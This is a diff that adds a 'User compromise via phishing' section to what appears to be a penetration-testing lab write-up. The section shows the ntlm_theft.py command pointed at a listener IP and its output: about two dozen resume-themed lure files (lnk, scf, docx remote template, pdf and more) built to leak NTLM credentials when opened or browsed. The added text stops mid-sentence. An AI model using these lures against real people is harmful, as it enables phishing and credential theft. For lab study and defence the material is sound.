@@ -248,5 +248,38 @@ Also gives me a hint on what files are allowed
 
 Based on the landing screen for this subdomain my next step is to try and phish the `john.doe` user with an xml file!
 
+# User compromise via phishing
 
+```python
+python3 ntlm_theft.py -g all -s 192.168.211.2 -f resume
+/home/kali/hsm/novaforge/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
+  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
+Created: resume/resume.scf (BROWSE TO FOLDER)
+Created: resume/resume-(url).url (BROWSE TO FOLDER)
+Created: resume/resume-(icon).url (BROWSE TO FOLDER)
+Created: resume/resume.lnk (BROWSE TO FOLDER)
+Created: resume/resume.rtf (OPEN)
+Created: resume/resume-(stylesheet).xml (OPEN)
+Created: resume/resume-(fulldocx).xml (OPEN)
+Created: resume/resume.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: resume/resume-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: resume/resume-(includepicture).docx (OPEN)
+Created: resume/resume-(remotetemplate).docx (OPEN)
+Created: resume/resume-(frameset).docx (OPEN)
+Created: resume/resume-(externalcell).xlsx (OPEN)
+Created: resume/resume.wax (OPEN)
+Created: resume/resume.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: resume/resume.asx (OPEN)
+Created: resume/resume.jnlp (OPEN)
+Created: resume/resume.application (DOWNLOAD AND OPEN)
+Created: resume/resume.pdf (OPEN AND ALLOW)
+Created: resume/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: resume/resume.library-ms (BROWSE TO FOLDER)
+Created: resume/Autorun.inf (BROWSE TO FOLDER)
+Created: resume/desktop.ini (BROWSE TO FOLDER)
+Created: resume/resume.theme (THEME TO INSTALL
+Generation Complete.
+```
+
+Ill use ntlm theft to generate the 
 
